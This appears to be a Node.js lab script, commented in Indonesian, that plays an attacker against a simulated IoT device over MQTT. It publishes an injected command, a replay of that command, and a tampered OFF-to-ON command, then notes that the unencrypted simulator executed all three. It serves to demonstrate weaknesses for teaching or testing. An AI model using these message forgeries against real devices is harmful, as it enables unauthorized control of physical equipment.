const mqtt = require("mqtt");

// Kredensial diambil dari environment, jangan ditulis di source.
// Contoh (PowerShell):
//   $env:MQTT_BROKER="mqtt://<host>:1883"; $env:MQTT_USER="..."; $env:MQTT_PASS="..."
const BROKER = process.env.MQTT_BROKER;
const CMD_TOPIC = "devices/sim_plain/command";

if (!BROKER || !process.env.MQTT_USER || !process.env.MQTT_PASS) {
  console.log("[ERROR] set dulu MQTT_BROKER, MQTT_USER, dan MQTT_PASS di environment");
  process.exit(1);
}

const client = mqtt.connect(BROKER, {
  username: process.env.MQTT_USER,
  password: process.env.MQTT_PASS,
  clientId: "penyerang_" + Math.random().toString(16).slice(2, 8),
  connectTimeout: 10000,
});

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function pub(payload, label) {
  return new Promise((resolve) => {
    console.log(`\n>>> [${label}] publish: ${payload}`);
    client.publish(CMD_TOPIC, payload, { qos: 1 }, () => resolve());
  });
}

client.on("error", (e) => {
  console.log("[ERROR]", e.message);
  process.exit(1);
});

client.on("connect", async () => {
  console.log("Penyerang terhubung ke broker. Mulai menyerang device tanpa enkripsi...");

  // 1. INJEKSI — perintah palsu dari nol
  const inject = JSON.stringify({ command: "ON", command_id: "inject-001" });
  await pub(inject, "INJEKSI");
  await sleep(1500);

  // 2. REPLAY — kirim ulang pesan yang sama persis
  await pub(inject, "REPLAY");
  await sleep(1500);

  // 3. TAMPERING — ambil perintah OFF, ubah isinya jadi ON sebelum dikirim
  const asli = { command: "OFF", command_id: "orig-777" };
  const diubah = { ...asli, command: "ON" }; // isi diubah OFF -> ON
  await pub(JSON.stringify(diubah), "TAMPERING (OFF diubah jadi ON)");
  await sleep(1500);

  console.log("\nSelesai. Lihat terminal device_sim.js: ketiga serangan DITERIMA & DIEKSEKUSI.");
  client.end(true);
  process.exit(0);
});
